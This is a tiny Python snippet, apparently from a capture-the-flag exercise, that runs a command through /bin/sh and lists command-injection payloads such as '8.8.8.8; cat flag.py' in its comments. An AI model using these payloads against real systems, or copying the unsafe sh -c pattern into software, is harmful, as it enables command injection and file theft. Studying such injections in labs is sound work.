import subprocess

cmd = "pwd"

output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
print(output)

# payload: 8.8.8.8; pwd
# payload: 8.8.8.8; ls
# payload: 8.8.8.8; cat flag.py

